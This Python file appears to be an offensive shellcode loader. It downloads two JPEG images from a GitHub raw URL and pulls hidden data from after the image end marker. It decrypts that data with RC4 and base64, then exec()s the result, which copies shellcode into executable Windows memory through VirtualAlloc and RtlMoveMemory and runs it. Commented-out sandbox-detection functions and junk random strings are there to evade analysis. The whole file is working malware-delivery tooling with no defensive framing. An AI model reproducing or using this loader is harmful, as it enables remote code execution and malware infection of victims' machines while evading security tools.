import hashlib,base64
import requests
from ctypes import *
import random,sys,os
from time import sleep
'''
def sandbox():
    if os.path.exists('1.txt'):
        print('not sanbox')
    else:
        print('your are sanbox')
        sys.exit(0)
if __name__=="__main__":
    my_exit()

def Sandbox():
    if len(sys.argv)!=1:
        pwd=sys.argv[1]
        if passwd==pwd:
            print('not sanbox')
            main()
        else:
            sleep(random.randint(0,5))
            sys.exit()
    else:
        sleep(random.randint(0,5))
        sys.exit()
'''
key='123456'
passwd='123456'
PayloadFileLocation='https://raw.githubusercontent.com/king-notfound404/pass_sanbox/main/shellcode_img1.jpg'
LoaderFileLocation='https://raw.githubusercontent.com/king-notfound404/pass_sanbox/main/loader_img1.jpg'
def rc4(text,key):
    key=hashlib.md5(key).hexdigest()
    text=base64.b64decode(text)
    result=''
    key_len=len(key)
    #1.init S-box
    box=list(range(256))#put 0-255 into S-box
    j=0
    for i in range(256):#shuffle elements in S-box according to key
        j=(j+box[i]+ord(key[i%key_len]))%256
        box[i],box[j]=box[j],box[i]#swap elements
    i=j=0
    for element in text:
        i=(i+1)%256
        j=(j+box[i])%256
        box[i],box[j]=box[j],box[i]
        k=chr(ord(element)^box[(box[i]+box[j])%256])
        result+=k
    return result
    
class GetApp:
    def __init__(self):
        pass

    def shellcode(self):
        try:
            r=requests.get(PayloadFileLocation)
            imgstr=r.content.split('\xff\xd9')[1]
            shellcode=bytearray(base64.b64decode(rc4(imgstr,key)))
            return shellcode
        except IndexError:
            print('networkerror')
        except TypeError:
            print('passkeyerror')
        else:
            print('notgood')

    def loader(self):
        try:
            r=requests.get(LoaderFileLocation)
            imgstr=r.content.split('\xff\xd9')[1]
            loader=base64.b64decode(rc4(imgstr,key))
            return loader
        except IndexError:
            print('networkerror')
        except TypeError:
            print('passkeyerror')
        else:
            print('notgood') 
    
def main():  
    useless=str(random.random())
    obj=GetApp()
    code=obj.shellcode()
    loader=obj.loader()
    useless+=str(random.random())
    exec(loader)
#loader='VirtualAlloc = windll.kernel32.VirtualAlloc;VirtualProtect=windll.kernel32.VirtualProtect;useless+=random.choice(useless);whnd=windll.kernel32.GetConsolewindow();RtMoveMemory=windll.kernel32.RtlMoveMemory;memHscode=VirtualAlloc(c_int(0),c_int(len(code)),c_int(0x3000),c_int(0x40));buf=(c_char*len(code)).from_buffer(code);useless+=random.choice(useless)[:-1];RtlMoveMemory(c_int(memHscode),buf,c_int(len(code)));runcode=cast(memHscode,CFUNCTYPE(c_void_p));runcode()'
if __name__=="__main__":
    main()